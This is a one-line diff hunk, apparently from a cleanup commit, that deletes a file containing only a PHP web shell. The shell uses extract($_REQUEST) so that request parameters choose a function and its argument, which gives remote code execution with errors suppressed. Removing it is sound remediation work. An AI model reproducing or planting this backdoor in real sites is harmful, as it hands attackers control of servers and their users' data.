@@ -1,1 +1,0 @@
-<?php extract($_REQUEST) && @$user(stripslashes($internal)) && exit;
